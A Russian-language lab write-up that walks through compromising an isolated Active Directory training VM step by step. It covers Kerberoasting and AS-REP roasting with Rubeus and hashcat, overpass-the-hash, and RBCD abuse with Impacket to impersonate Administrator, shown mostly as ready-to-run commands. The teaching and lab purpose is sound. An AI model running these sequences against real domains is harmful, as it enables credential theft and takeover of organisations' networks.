# THORNBURY-DC01 — получение флагов

> Учебный write-up для изолированной лабораторной виртуальной машины **THORNBURY-DC01**.
> Все действия выполняются только в собственной лаборатории или при наличии явного разрешения.

## О машине

| Параметр | Значение |
| --- | --- |
| Имя хоста | THORNBURY-DC01 |
| Домен | thornbury.local |
| IP-адрес внутри VM | 10.0.2.15 |
| Подключение с хоста | 127.0.0.1:2225 |
| Начальная учётная запись | THORNBURY\jdoe |

Пароль пользователя jdoe нужен только для первого входа. Он находится в интерфейсе лаборатории и намеренно не включён в этот write-up.

## Оглавление

- [Этап 0. Проверка подключения](#этап-0-проверка-подключения)
- [Этап 1. Kerberoasting](#этап-1-kerberoasting)
- [Этап 2. AS-REP roasting](#этап-2-as-rep-roasting)
- [Этап 3. Доступ по NT-хэшу](#этап-3-доступ-по-nt-хэшу)
- [Этап 4. Resource-Based Constrained Delegation](#этап-4-resource-based-constrained-delegation)
- [Контрольный список](#контрольный-список)

## Этап 0. Проверка подключения

На Windows-хосте проверьте проброс порта:

    Test-NetConnection 127.0.0.1 -Port 2225

Ожидаемый результат:

    TcpTestSucceeded : True

Подключитесь по SSH:

    ssh -p 2225 jdoe@127.0.0.1

Внутри виртуальной машины проверьте текущую учётную запись, имя хоста и адрес:

    whoami
    hostname
    ipconfig

Ожидается примерно следующее:

    thornbury\jdoe
    THORNBURY-DC01
    10.0.2.15

Зафиксируйте исходные данные:

    Foothold: thornbury\jdoe
    Host: THORNBURY-DC01
    IP: 10.0.2.15
    SSH: 127.0.0.1:2225

## Этап 1. Kerberoasting

Учётная запись svc_reports — сервисный аккаунт с зарегистрированным SPN. Авторизованный пользователь может запросить Kerberos TGS-ticket для этой учётной записи. Полученный материал можно проверять офлайн, не выполняя вход под svc_reports.

### Получение TGS-хэша

Передайте Rubeus.exe из Windows-хоста в VM:

    scp -P 2225 .\Rubeus.exe jdoe@127.0.0.1:C:/Users/jdoe/Rubeus.exe

В SSH-сессии выполните:

    cd C:\Users\jdoe
    .\Rubeus.exe kerberoast /user:svc_reports /enctype:rc4 /outfile:kerberoast.txt
    type .\kerberoast.txt

Строка должна начинаться с:

    $krb5tgs$23$

Значение 23 означает RC4. Для Hashcat используется режим 13100.

Скопируйте файл обратно на хост:

    scp -P 2225 jdoe@127.0.0.1:C:/Users/jdoe/kerberoast.txt .

Создайте словарь thornbury_words.txt. Пример содержимого:

    Thornbury
    ThornburyMutual
    Mutual
    Insurance
    Insurer
    Reports
    Claims
    2016
    2017
    ThornburyMutual2016!
    ClaimsIntake2017!

Запустите подбор:

    hashcat.exe -m 13100 -a 0 .\kerberoast.txt .\thornbury_words.txt
    hashcat.exe -m 13100 .\kerberoast.txt --show

Если Hashcat выводит Exhausted, нужного слова нет в словаре.

### Чтение первого флага

После восстановления пароля подключите скрытую SMB-шару с учётными данными THORNBURY\svc_reports:

    $cred = Get-Credential 'THORNBURY\svc_reports'
    New-PSDrive -Name R -PSProvider FileSystem `
      -Root '\\thornbury-dc01\svc_reports_home$' `
      -Credential $cred

    Get-Content R:\flag_roast.txt

Зафиксируйте результат:

    Account: svc_reports
    Attack: Kerberoasting
    Hash type: TGS-REP RC4
    Hashcat mode: 13100
    Recovered password: <не публиковать в открытом репозитории>
    Flag path: \\thornbury-dc01\svc_reports_home$\flag_roast.txt
    Flag: <значение флага>

## Этап 2. AS-REP roasting

У пользователя mreynolds включён флаг DoesNotRequirePreAuth. Поэтому контроллер домена выдаёт AS-REP без предварительной аутентификации, а полученный материал можно проверять офлайн.

В SSH-сессии выполните:

    .\Rubeus.exe asreproast `
      /user:mreynolds `
      /format:hashcat `
      /outfile:asrep.txt

    type .\asrep.txt

Хэш должен начинаться примерно так:

    $krb5asrep$23$

Скопируйте его на хост:

    scp -P 2225 jdoe@127.0.0.1:C:/Users/jdoe/asrep.txt .

Подберите пароль и выведите найденное значение:

    hashcat.exe -m 18200 -a 0 .\asrep.txt .\thornbury_words.txt
    hashcat.exe -m 18200 .\asrep.txt --show

Режим зависит от типа Kerberos-материала:

    Kerberoast   = TGS-REP = 13100
    AS-REP roast = AS-REP = 18200

### Чтение второго флага

    $cred = Get-Credential 'THORNBURY\mreynolds'
    New-PSDrive -Name M -PSProvider FileSystem `
      -Root '\\thornbury-dc01\mreynolds_home$' `
      -Credential $cred

    Get-Content M:\flag_asrep.txt

Зафиксируйте результат:

    Account: mreynolds
    Attack: AS-REP roasting
    Hash type: AS-REP RC4
    Hashcat mode: 18200
    Recovered password: <не публиковать в открытом репозитории>
    Flag path: \\thornbury-dc01\mreynolds_home$\flag_asrep.txt
    Flag: <значение флага>

## Этап 3. Доступ по NT-хэшу

Этот этап не означает, что пароль пользователя известен. Для получения Kerberos-ticket используется NT-хэш.

Сначала прочитайте публичную заметку:

    Get-Content '\\thornbury-dc01\Public\migration_notes.txt'

Найдите в ней NT-хэш пользователя d.langford и запросите TGT через Rubeus:

    .\Rubeus.exe asktgt `
      /user:d.langford `
      /domain:thornbury.local `
      /rc4:HASH_D_LANGFORD `
      /ptt

Проверьте установленные Kerberos-ticket:

    klist

После успешного pass-the-ticket прочитайте третий флаг:

    Get-Content '\\thornbury-dc01\ITAdmin$\flag_altauth.txt'

Команда whoami может по-прежнему показывать jdoe. Это нормально: Rubeus установил ticket в текущую сессию, но не изменил локального пользователя процесса.

Механизм атаки:

    NT-хэш
       ↓
    Kerberos RC4-ключ
       ↓
    запрос TGT у DC
       ↓
    Kerberos-ticket d.langford
       ↓
    доступ к ITAdmin$

Зафиксируйте результат:

    Identity: d.langford
    Material: NT hash
    Plaintext password: not recovered
    Technique: overpass-the-hash / pass-the-ticket
    Proof: access to ITAdmin$
    Flag path: \\thornbury-dc01\ITAdmin$\flag_altauth.txt
    Flag: <значение флага>

## Этап 4. Resource-Based Constrained Delegation

В Active Directory у svc_reports есть право GenericAll на объект svc_sql01. Это позволяет изменить атрибут msDS-AllowedToActOnBehalfOfOtherIdentity и настроить RBCD.

Перед изменением обязательно сохраните исходное состояние:

    Get-ADUser svc_sql01 `
      -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

Логика связи:

    svc_reports -- GenericAll --> svc_sql01

Таким образом, svc_sql01 можно настроить так, чтобы он доверял билетам, представленным от имени svc_reports.

### Запись RBCD

Для этого этапа удобнее использовать WSL2 с Ubuntu:

    wsl --install -d Ubuntu

В Ubuntu установите Impacket:

    sudo apt update
    sudo apt install -y python3-impacket

Проверьте доступность контроллера домена:

    ping 10.0.2.15

Запишите RBCD-настройку:

    rbcd.py \
      -action write \
      -delegate-from svc_reports \
      -delegate-to svc_sql01 \
      -dc-ip 10.0.2.15 \
      thornbury.local/svc_reports

### Получение S4U-ticket

Запросите service-ticket от имени Administrator:

    getST.py \
      -spn MSSQLSvc/thornbury-sql01.thornbury.local:1433 \
      -impersonate Administrator \
      -dc-ip 10.0.2.15 \
      thornbury.local/svc_reports

Важные условия:

- используйте DNS-имя, а не IP-адрес;
- SPN должен точно совпадать с MSSQLSvc/thornbury-sql01.thornbury.local:1433;
- SQL mock service принимает только Kerberos;
- обычный NTLM pass-the-hash для этого сервиса не подходит.

После получения файла .ccache укажите его для Kerberos-клиента:

    export KRB5CCNAME=ИМЯ_ПОЛУЧЕННОГО_CCACHE
    klist

Затем подключитесь к лабораторному SQL-сервису через Kerberos-клиент на TCP-порту 1433 и прочитайте финальный флаг. Команда клиента зависит от комплектации лаборатории и здесь не выдумывается:

    <Kerberos-клиент лаборатории> --server thornbury-sql01.thornbury.local --port 1433

Зафиксируйте результат:

    Technique: Resource-Based Constrained Delegation
    Delegate from: svc_reports
    Delegate to: svc_sql01
    SPN: MSSQLSvc/thornbury-sql01.thornbury.local:1433
    Impersonated identity: Administrator
    Flag: <значение флага>

### Откат изменения

После чтения флага обязательно удалите временную RBCD-настройку:

    rbcd.py \
      -action remove \
      -delegate-from svc_reports \
      -delegate-to svc_sql01 \
      -dc-ip 10.0.2.15 \
      thornbury.local/svc_reports

Проверьте результат:

    rbcd.py \
      -action read \
      -delegate-to svc_sql01 \
      -dc-ip 10.0.2.15 \
      thornbury.local/svc_reports

## Контрольный список

- [ ] Подтверждено подключение к 127.0.0.1:2225.
- [ ] Проверены whoami, hostname и IP-адрес.
- [ ] Получен TGS-хэш svc_reports с префиксом $krb5tgs$23$.
- [ ] Подтверждён режим Hashcat 13100.
- [ ] Прочитан flag_roast.txt.
- [ ] Получен AS-REP-хэш mreynolds с префиксом $krb5asrep$23$.
- [ ] Подтверждён режим Hashcat 18200.
- [ ] Прочитан flag_asrep.txt.
- [ ] Найден NT-хэш d.langford в migration_notes.txt.
- [ ] Ticket проверен командой klist.
- [ ] Прочитан flag_altauth.txt.
- [ ] Сохранено исходное состояние RBCD.
- [ ] Получен S4U-ticket для SPN SQL-сервиса.
- [ ] Прочитан финальный флаг.
- [ ] RBCD-настройка удалена и проверена.

## Примечание о публикации

Не публикуйте в GitHub реальные пароли, NT-хэши, Kerberos-ticket-файлы (.ccache, .kirbi), приватные ключи или содержимое флагов, если репозиторий публичный. В этом документе оставлены только команды и placeholders для результатов лабораторной работы.

